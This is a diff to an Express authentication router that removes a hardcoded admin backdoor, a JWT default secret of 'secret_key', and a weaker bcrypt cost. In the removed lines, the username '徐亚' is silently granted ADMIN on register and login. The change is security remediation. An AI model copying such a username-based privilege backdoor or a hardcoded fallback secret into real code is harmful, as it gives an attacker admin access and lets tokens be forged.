@@ -5,7 +5,16 @@ import prisma from '../db.js'
 import { writeLog } from '../operationLog.js'
 
 const router = Router()
-const JWT_SECRET = process.env.JWT_SECRET || 'secret_key'
+const JWT_SECRET = process.env.JWT_SECRET
+
+if (!JWT_SECRET) {
+  if (process.env.NODE_ENV === 'production') {
+    throw new Error('FATAL ERROR: JWT_SECRET environment variable is not set.')
+  } else {
+    console.warn('WARNING: JWT_SECRET is not set. Using a weak fallback secret for development.')
+  }
+}
+const ACTIVE_JWT_SECRET = JWT_SECRET || 'dev_secret_key_do_not_use_in_prod'
 
 // Register
 router.post('/register', async (req: Request, res: Response): Promise<void> => {
@@ -19,8 +28,8 @@ router.post('/register', async (req: Request, res: Response): Promise<void> => {
     }
 
     const isFirstUser = (await prisma.user.count()) === 0
-    const role = isFirstUser || username === '徐亚' ? 'ADMIN' : 'USER'
-    const hashedPassword = await bcrypt.hash(password, 10)
+    const role = isFirstUser ? 'ADMIN' : 'USER'
+    const hashedPassword = await bcrypt.hash(password, 12)
 
     const user = await prisma.user.create({
       data: {
@@ -38,7 +47,7 @@ router.post('/register', async (req: Request, res: Response): Promise<void> => {
       detail: `${user.username} (${user.role})`,
     })
 
-    const token = jwt.sign({ id: user.id, role: user.role, username: user.username }, JWT_SECRET, { expiresIn: '7d' })
+    const token = jwt.sign({ id: user.id, role: user.role, username: user.username }, ACTIVE_JWT_SECRET, { expiresIn: '7d' })
     res.json({ token, user: { id: user.id, username: user.username, role: user.role } })
   } catch (error) {
     res.status(500).json({ error: '服务器错误' })
@@ -62,10 +71,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return
     }
 
-    const role = username === '徐亚' ? 'ADMIN' : user.role
-    if (role !== user.role) {
-      await prisma.user.update({ where: { id: user.id }, data: { role } })
-    }
+    const role = user.role
 
     await writeLog({
       actorId: user.id,
@@ -74,7 +80,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       detail: user.username,
     })
 
-    const token = jwt.sign({ id: user.id, role, username: user.username }, JWT_SECRET, { expiresIn: '7d' })
+    const token = jwt.sign({ id: user.id, role, username: user.username }, ACTIVE_JWT_SECRET, { expiresIn: '7d' })
     res.json({ token, user: { id: user.id, username: user.username, role } })
   } catch (error) {
     res.status(500).json({ error: '服务器错误' })
@@ -90,7 +96,7 @@ router.get('/me', async (req: Request, res: Response): Promise<void> => {
       return
     }
 
-    const decoded = jwt.verify(token, JWT_SECRET) as { id: string }
+    const decoded = jwt.verify(token, ACTIVE_JWT_SECRET) as { id: string }
     const user = await prisma.user.findUnique({
       where: { id: decoded.id },
       select: { id: true, username: true, role: true, profile: true }
